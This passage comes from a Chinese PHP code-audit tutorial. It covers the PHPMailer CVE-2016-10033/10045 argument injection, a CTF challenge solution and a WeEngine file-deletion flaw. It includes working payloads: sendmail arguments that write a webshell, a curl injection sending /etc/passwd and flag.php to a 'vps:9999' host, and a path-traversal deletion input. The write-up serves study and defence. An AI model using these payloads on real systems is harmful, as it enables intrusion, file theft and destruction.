<strong>sendmailSend</strong> 函数中加了 <strong>validateAddress</strong> 函数，来针对发送的数据进行判断，判断邮箱地址的合法性。另外针对传入的数据，调用了 <strong>escapeshellarg</strong> 函数来转义特殊符号，防止注入参数。然而这样做，就引入了我们上面讨论的问题，即同时使用 <strong>escapeshellarg</strong> 函数和 <strong>escapeshellcmd()</strong> 函数，导致单引号逃逸。由于程序没有对传命令参数的地方进行转义，所以我们可以结合 <strong>mail</strong> 函数的第五个参数 <strong>-X</strong> 写入 <strong>webshell</strong> 。</p><p>下面详细看一下代码，漏洞具体位置在 <strong>class.phpmailer.php</strong> 中，我们截取部分相关代码如下 ：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-8.png"></p><p>在上图第12行处没有对 <strong>$params</strong> 变量进行严格过滤，只是简单地判断是否为 <strong>null</strong> ，所以可以直接传入命令。我们继续往下看，我们发现在上图第12行，当 <strong>safe_mode</strong> 模式处于关闭状态时， <strong>mail()</strong> 函数才会传入 <strong>$params</strong> 变量。<br>进一步跟跟进 <strong>$params</strong> 参数，看看它是怎么来的。这个参数的位置在 <strong>class.phpmailer.php</strong> 中，我们截取部分相关代码，具体看下图 <strong>第11行</strong> ： </p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-9.png"></p><p>很明显 <strong>$params</strong> 是从 <strong>$this-&gt;Sender</strong> 传进来的，我们找一下 <strong>$this-&gt;Sender</strong> ，发现这个函数在 <strong>class.phpmailer.php</strong> 中，截取部分相关代码，具体看下图 <strong>第10行</strong> ：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-10.png"></p><p>这里在 <strong>setFrom</strong> 函数中将 <strong>$address</strong> 经过某些处理之后赋值给 <strong>$this-&gt;Sender</strong> 。我们详细看看 <strong>$address</strong> 变量是如何处理的。主要处理函数均在 <strong>class.phpmailer.php</strong> 文件中，我们截取了部分相关代码，在下图 <strong>第三行</strong> 中使用了 <strong>validateAddress</strong> 来处理 <strong>$address</strong> 变量。</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-11.png"></p><p>所以跟进一下 <strong>validateAddress</strong> 函数，这个函数位置在 <strong>class.phpmailer.php</strong> 文件中。我们看看程序流程，相关代码如下：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-12.png"></p><p>分析一下这段代码，大概意思就是对环境进行了判断，如果没有 <strong>prce</strong> 并且 <strong>php</strong> 版本 <strong>&lt;5.2.0</strong> ，则 <strong>$patternselect &#x3D; ‘noregex’</strong> 。接着往下看，在 <strong>class.phpmailer.php</strong> 文件中，有部分关于 <strong>$patternselect</strong> 的 <strong>swich</strong> 操作，我只选择了我们需要的那个，跟踪到下面的 <strong>noregex</strong> 。</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-13.png"></p><p>这里简单的只是根据 <strong>@</strong> 符号来处理字符，所以这里的payload很简单。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span><br></pre></td></tr></table></figure><p>然后通过 <strong>linux</strong> 自身的 <strong>sendmail</strong> 写log的方式，把log写到web根目录下。将日志文件后缀定义为 <strong>.php</strong> ，即可成功写入webshell。</p><h4 id="CVE-2016-10045-1"><a href="#CVE-2016-10045-1" class="headerlink" title="CVE-2016-10045"></a>CVE-2016-10045</h4><p>diff一下5.2.20和5.2.18发现针对 <strong>escapeshellcmd</strong> 和 <strong>escapeshellarg</strong> 做了改动。</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-14.png"></p><p>这里其实有个很奇妙的漏洞，针对用户输入使用 <strong>escapeshellarg</strong> 函数进行处理。所以，在最新版本中使用之前的 payload 进行攻击会失败，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span><br></pre></td></tr></table></figure><p>但是，却可以使用下面这个  <strong>payload</strong> 进行攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span><br></pre></td></tr></table></figure><p>实际上，可用于攻击的代码只是在之前的基础上多了一个单引号。之所以这次的攻击代码能够成功，是因为修复代码多了  <strong>escapeshellcmd</strong> 函数，结合上 <strong>mail()</strong> 函数底层调用的 <strong>escapeshellarg</strong> 函数，最终导致单引号逃逸。</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-15.png"></p><p>我们的 <strong>payload</strong> 最终在执行时变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;-fa&#x27;\\&#x27;&#x27;\( -OQueueDirectory=/tmp -X/var/www/html/test.php \)@a.com\&#x27;</span><br></pre></td></tr></table></figure><p>按照刚才上面的分析，我们将payload化简分割一下就是<code>-fa\(</code>、<code>-OQueueDirectory=/tmp</code>、<code>-X/var/www/html/test.php</code>、<code>)@a.com&#39;</code>，这四个部分。最终的参数就是这样被注入的。</p><p>漏洞利用</p><p>漏洞有一些基本要求：<br><strong>1、php version &lt; 5.2.0</strong><br><strong>2、phpmailer &lt; 5.2.18</strong><br><strong>3、php 没有安装 pcre（no default）</strong><br><strong>4、safe_mode &#x3D; false（default）</strong></p><p>存在正则绕过之后，以及 <strong>escapeshellarg</strong>  和 <strong>escapeshellcmd</strong> 一起使用造成的神奇现象之后。</p><p>只需要 <strong>phpmailer &lt; 5.2.20</strong> </p><p><strong><a href="https://github.com/opsxcq/exploit-CVE-2016-10033">环境，poc，exp相关</a></strong></p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-16.png"></p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>我们来看一下 <strong>PHPMailer</strong> 官方给出的修复代码。官方对用户传入的参数进行检测，如果当中存在被转义的字符，则不传递 <strong>-f</strong> 参数（**-f** 参数表示发邮件的人，如果不传递该参数，我们的payload就不会被带入 <strong>mail</strong> 函数，也就不会造成命令执行），所以不建议大家同时使用 <strong>escapeshellcmd()</strong> 和 <strong>escapeshellarg()</strong> 函数对参数进行过滤，具体修复代码如下：<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-17.png"></p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>看完了上述分析，不知道大家是否对 <strong>escapeshellarg()</strong> 和 <strong>escapeshellcmd()</strong> 两个函数一起使用所产生的问题，有了更加深入的理解，文中用到的代码可以从 <a href="https://github.com/PHPMailer/PHPMailer">这里</a> 下载，当然文中若有不当之处，还望各位斧正。如果你对我们的项目感兴趣，欢迎发送邮件到 <strong><a href="mailto:&#x68;&#x6f;&#x6e;&#x67;&#x72;&#x69;&#115;&#101;&#x63;&#x40;&#103;&#109;&#x61;&#105;&#x6c;&#46;&#x63;&#111;&#x6d;">&#x68;&#x6f;&#x6e;&#x67;&#x72;&#x69;&#115;&#101;&#x63;&#x40;&#103;&#109;&#x61;&#105;&#x6c;&#46;&#x63;&#111;&#x6d;</a></strong> 联系我们。<strong>Day5</strong> 的分析文章就到这里，我们最后留了一道CTF题目给大家练手，题目如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>,<span class="variable">$key</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;are you a hacker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_GET&#x27;</span>, <span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$__R</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$__R</span>) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$$__R</span> <span class="keyword">as</span> <span class="variable">$__k</span> =&gt; <span class="variable">$__v</span>) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$$__k</span>) &amp;&amp; <span class="variable">$$__k</span> == <span class="variable">$__v</span>) <span class="keyword">unset</span>(<span class="variable">$$__k</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) &#123; <span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) &#123; <span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>); &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>) &#123; <span class="title function_ invoke__">waf</span>(<span class="variable">$_COOKIE</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;hongri&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] ) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hongri&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$urlInfo</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="string">&quot;http&quot;</span> === <span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>]) || <span class="string">&quot;https&quot;</span>===<span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>])))&#123;</span><br><span class="line">            <span class="keyword">die</span>( <span class="string">&quot;scheme error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl &quot;</span>.<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道题主要考察全局变量覆盖，结合 unset 函数绕过waf，以及通过 curl 读取文件，接下来我们将代码分为两个部分看看吧。我们看到 第11行-14行 有这样一串代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_GET&#x27;</span>, <span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$__R</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$__R</span>) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$$__R</span> <span class="keyword">as</span> <span class="variable">$__k</span> =&gt; <span class="variable">$__v</span>) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$$__k</span>) &amp;&amp; <span class="variable">$$__k</span> == <span class="variable">$__v</span>) <span class="keyword">unset</span>(<span class="variable">$$__k</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析一下这串代码的逻辑：<br>首先 第一行 ，循环获取字符串 GET、POST、COOKIE ，并依次赋值给变量 $__R 。在 第二行 中先判断 $$__R 变量是否存在数据，如果存在，则继续判断超全局数组 GET、POST、COOKIE 中是否存在键值相等的，如果存在，则删除该变量。这里有个 可变变量 的概念需要先理解一下。可变变量指的是：一个变量的变量名可以动态的设置和使用。一个可变变量获取了一个普通变量的值作为其变量名。<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-18.png"></p><p>这里使用 <strong>$$</strong> 将通过 <strong>变量a</strong> 获取到的数据，注册成为一个<strong>新的变量</strong>（这里是 <strong>变量hello</strong> ）。然后会发现变量 <strong>$$a</strong> 的输出数据和变量 <strong>$hello</strong>  的输出数据一致（如上图，输出为 <strong>world</strong> ）。</p><p>我通过 <strong>GET</strong> 请求向 <strong>index.php</strong> 提交 <strong>flag&#x3D;test</strong> ，接着通过 <strong>POST</strong> 请求提交 <strong>_GET[flag]&#x3D;test</strong> 。当开始遍历 <strong>$_POST</strong> 超全局数组的时候， <strong>$__k</strong> 代表 <strong>_GET[flag]</strong> ，所以 <strong>$$__k</strong> 就是 <strong>$_GET[flag]</strong> ，即 <strong>test</strong> 值，此时 <strong>$$__k</strong> &#x3D;&#x3D; <strong>$__v</strong> 成立，变量 <strong>$_GET[flag]</strong> 就被 <strong>unset</strong> 了。但是在 <strong>第21行</strong> 和 <strong>22行</strong> 有这样一串代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>, EXTR_SKIP);</span><br></pre></td></tr></table></figure><p> <strong>extract</strong> 函数的作用是将对象内的键名变成一个变量名，而这个变量对应的值就是这个键名的值， <strong>EXTR_SKIP</strong> 参数表示如果前面存在此变量，不对前面的变量进行覆盖处理。由于我们前面通过 <strong>POST</strong> 请求提交 <strong>_GET[flag]&#x3D;test</strong> ，所以这里会变成 <strong>$_GET[flag]&#x3D;test</strong> ，这里的 <strong>$_GET</strong> 变量就不需要再经过 <strong>waf</strong> 函数检测了，也就绕过了 <strong>preg_match(‘&#x2F;flag&#x2F;i’,$key)</strong> 的限制。下面举个 <strong>extract</strong> 函数用例：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-19.png"></p><p>接着到了24行比较两个变量的md5值，我们构造出2个0e开头的md5即可绕过，这样就进入第二阶段。</p><p>第二阶段主要考察 <strong>curl</strong> 读取文件。这里主要加了两个坑，我们之前说过的两个函数 <strong>escapeshellarg()</strong> 和 <strong>escapeshellcmd()</strong> 一起使用的时候会造成的问题，主要看看这部分代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] ) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hongri&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$urlInfo</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="string">&quot;http&quot;</span> === <span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>]) || <span class="string">&quot;https&quot;</span>===<span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>])))&#123;</span><br><span class="line">            <span class="keyword">die</span>( <span class="string">&quot;scheme error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl &quot;</span>.<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里的 <strong>第8行</strong> 和 <strong>第9行</strong> 增加了两个过滤。</p><ul><li><strong>escapeshellarg</strong> ，将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</li><li><strong>escapeshellcmd</strong> ，会对以下的字符进行转义&amp;#;<code>|*?~&lt;&gt;^()[]&#123;&#125;$</code>, <code>x0A</code> 和 <code>xFF</code>, <code>&#39;</code> 和 <code>&quot;</code>仅在不配对儿的时候被转义。</li></ul><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-20.png"></p><p>在字符串增加了引号同时会进行转义，那么之前的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index1.php?url=http://127.0.0.1 -T /etc/passwd</span><br></pre></td></tr></table></figure><p>因为增加了 <strong>‘</strong> 进行了转义，所以整个字符串会被当成参数。注意 <strong>escapeshellcmd</strong> 的问题是在于如果 <strong>‘</strong> 和 <strong>“</strong> 仅在不配对儿的时候被转义。那么如果我们多增加一个 <strong>‘</strong> 就可以扰乱之前的转义了。如下：<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-21.png"></p><p>在 <strong>curl</strong> 中存在 <strong>-F</strong> 提交表单的方法，也可以提交文件。 <strong>-F &lt;key&#x3D;value&gt;</strong> 向服务器POST表单，例如： <strong>curl -F “web&#x3D;@index.html;type&#x3D;text&#x2F;html” url.com</strong> 。提交文件之后，利用代理的方式进行监听，这样就可以截获到文件了,同时还不受最后的的影响。那么最后的payload为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://baidu.com/&#x27; -F file=@/etc/passwd -x  vps:9999</span><br></pre></td></tr></table></figure><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-22.png"></p><p>这里应该是和 <strong>curl</strong> 版本有关系，我在 **7.54.0 ** 下没有测试成功。<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-23.png"></p><p>题目中的 <strong>curl</strong> 版本是 <strong>7.19.7</strong><br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-24.png"></p><p>根据猜测，可能在是新版本中，先会执行 <strong>curl http</strong> 的操作，但是由于在后面增加了,例如 <strong><a href="http://127.0.0.1,/">http://127.0.0.1，</a></strong> 但是curl无法找到这样的文件，出现404。出现404之后，后面的提交文件的操作就不进行了，程序就退出了。这样在vps上面就无法接受到文件了。</p><h3 id="解题payload："><a href="#解题payload：" class="headerlink" title="解题payload："></a>解题payload：</h3><p>所以这题最后的 <strong>payload</strong> 是这样的。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?flag=QNKCDZO&amp;hongri=s878926199a&amp;url=http://baidu.com/&#x27;</span> -<span class="keyword">F</span> <span class="string">file=@/var/www/html/flag.php</span> -x <span class="string"></span> vps:9999 <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> 127.0.0.1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=om11lglr53tm1htliteav4uhk4</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>112</span><br><span class="line"></span><br><span class="line"><span class="language-sqf"><span class="variable">_GET</span>[<span class="built_in">flag</span>]=QNKCDZO&amp;<span class="variable">_GET</span>[hongri]=s878926199a&amp;<span class="variable">_GET</span>[url]=http:<span class="comment">//baidu.com/&#x27; -F file=@/var/www/html/flag.php -x  vps:9999</span></span></span><br></pre></td></tr></table></figure><p><a href="https://lorexxar.cn/2016/12/28/cve-2016-10030/">phpmailer RCE漏洞分析</a><br><a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇</a><br><a href="https://blog.chaitin.cn/phpmailer-cve-2016-10033/">PHPMailer 命令执行漏洞（CVE-2016-10033）分析</a></p><h2 id="Forst-Pattern"><a href="#Forst-Pattern" class="headerlink" title="Forst Pattern"></a>Forst Pattern</h2><p>题目叫福斯特模式，代码如下<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-25.png"></p><p><strong>漏洞解析</strong> ：</p><p>这一关考察的内容是由正则表达式不严谨导致的任意文件删除漏洞， 导致这一漏洞的原因在 <strong>第19行</strong> ， <strong>preg_replace</strong> 中的 <strong>pattern</strong> 部分 ，该正则表达式并未起到过滤目录路径字符的作用。<code>[^a-z.-_]</code>  表示匹配除了 <strong>a</strong> 字符到 <strong>z</strong> 字符、**.** 字符到 <strong>_</strong> 字符之间的所有字符。因此，攻击者还是可以使用点和斜杠符号进行路径穿越，最终删除任意文件，例如使用 <strong>payload</strong> ： <code>action = delete＆data = ../../ config.php</code>，便可删除 <strong>config.php</strong> 文件。</p><blockquote><p><a href="http://php.net/manual/zh/function.preg-replace.php"><strong>preg_replace</strong></a>：(PHP 4, PHP 5, PHP 7)</p><p><strong>功能</strong> ： 函数执行一个正则表达式的搜索和替换</p><p><strong>定义</strong> ： <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p><p>搜索 <strong>subject</strong> 中匹配 <strong>pattern</strong> 的部分， 如果匹配成功将其替换成 <strong>replacement</strong> 。</p></blockquote><h3 id="实例分析-1"><a href="#实例分析-1" class="headerlink" title="实例分析"></a>实例分析</h3><p>本次实例分析，我们选取的是 <strong>WeEngine0.8</strong> 版本。漏洞入口文件为 <strong>web&#x2F;source&#x2F;site&#x2F;category.ctrl.php</strong> ，我们可以看到下图 <strong>14行</strong> 处调用了 <strong>file_delete</strong> 函数，而这是一个文件删除相关操作，我们可以看一下该函数的具体定义。下图是入口文件代码：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-26.png"></p><p> <strong>file_delete</strong> 这一函数可以在 <strong>framework&#x2F;function&#x2F;file.func.php</strong> 文件中找到，该方法功能用于检测文件是否存在，如果存在，则删除文件。但是查看上下文发现，程序并没有对文件名 <strong>$file</strong> 变量进行过滤，所以文件名就可以存在类似 <strong>..&#x2F;</strong> 这种字符，这样也就引发任意文件删除漏洞，<strong>file_delete</strong> 函数代码如下：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-27.png"></p><p>现在我们在回溯回去，看看 <strong>$file</strong> 变量从何处来。实际上，上图的 <strong>$file</strong> 变量对应的是 <strong>$row[‘icon’]</strong> 的值，也就是说如果我们可以控制 <strong>$row[‘icon’]</strong> 的值，就可以删除任意文件。那么我们来看看 <strong>$row</strong> 变量从何而来。该变量就在我们刚刚分析的第一张图片中( <strong>web&#x2F;source&#x2F;site&#x2F;category.ctrl.php</strong> 文件)，该值为变量 <strong>$navs</strong> 中的元素值，具体代码如下：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-28.png"></p><p>我们再往上看，即可找到 <strong>$navs</strong> 变量的取值情况。可以看到 <strong>$navs</strong> 变量的是从数据库 <strong>site_nav</strong> 表中取出的，包含了 <strong>icon</strong> 和 <strong>id</strong> 两个字段，具体代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$navs</span> = <span class="title function_ invoke__">pdo_fetchall</span>(<span class="string">&quot;SELECT icon, id FROM &quot;</span>.<span class="title function_ invoke__">tablename</span>(<span class="string">&#x27;site_nav&#x27;</span>).<span class="string">&quot; WHERE id IN (SELECT nid FROM &quot;</span>.<span class="title function_ invoke__">tablename</span>(<span class="string">&#x27;site_category&#x27;</span>).<span class="string">&quot; WHERE id = <span class="subst">&#123;$id&#125;</span> OR parentid = &#x27;<span class="subst">$id</span>&#x27;)&quot;</span>, <span class="keyword">array</span>(), <span class="string">&#x27;id&#x27;</span>);</span><br></pre></td></tr></table></figure><p>现在我们要做的，就是找找看数据库中的这两个字段是否可以被用户控制。我们继续往前查找，发现了如下代码：<img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-29.png"></p><p><strong>site_nav</strong> 表中的数据，对应的是 <strong>$nav</strong> 变量。我们继续往上寻找 <strong>$nav</strong> 变量，发现 <strong>$nav[‘icon’]</strong> 变量是从 <strong>$_GPC[‘iconfile’]</strong> 来的，即可被用户控制( 下图 <strong>第21行</strong> )。这里的 <strong>$nav[‘icon’]</strong> 变量，其实就是我们文章开头分析的传入 <strong>file_delete</strong> 函数的参数，具体代码如下：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-30.png"></p><p>由于 <strong>$nav[‘icon’]</strong> 变量可被用户控制，程序有没有对其进行消毒处理，直接就传入了 <strong>file_delete</strong> 函数，最终导致了文件删除漏洞。至此，我们分析完了整个漏洞的发生过程，接下看看如何进行攻击。</p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>访问url：<a href="http://xxx.xxx.xxx.xxx/WeEngine/web/index.php?c=account&a=display">http://xxx.xxx.xxx.xxx/WeEngine/web/index.php?c=account&amp;a=display</a> ，点击管理公众号：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-31.png"></p><p>找到分类设置，点击添加文章分类。这里对应的url为：<a href="http://xxx.xxx.xxx.xxx/WeEngine/web/index.php?c=site&a=category%EF%BC%8C%E5%AE%9E%E9%99%85%E4%B8%8A%E8%A1%A8%E7%A4%BA">http://xxx.xxx.xxx.xxx/WeEngine/web/index.php?c=site&amp;a=category，实际上表示</a> <strong>site</strong> 控制器的 <strong>category</strong> 模块，即对应 